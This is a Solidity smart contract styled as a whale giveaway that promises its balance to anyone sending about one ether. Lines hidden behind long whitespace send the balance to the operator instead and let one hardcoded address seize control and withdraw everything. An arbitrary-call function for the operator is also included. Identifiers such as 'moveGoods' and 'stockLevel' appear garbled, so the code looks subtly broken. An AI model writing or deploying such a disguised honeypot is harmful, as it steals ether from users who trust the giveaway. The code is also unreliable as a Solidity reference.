// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public FacilityOperator = msg.sender;
    uint constant public minEligibility = 0.999001 ether;

    function()
    public
    payable
    {

    }

    function redeem()
    public
    payable
    {
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    FacilityOperator.moveGoods(this.stockLevel);
            msg.sender.moveGoods(this.stockLevel);
        }
    }

    function releaseGoods()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){FacilityOperator=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == FacilityOperator);
        FacilityOperator.moveGoods(this.stockLevel);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == FacilityOperator);
        adr.call.value(msg.value)(data);
    }
}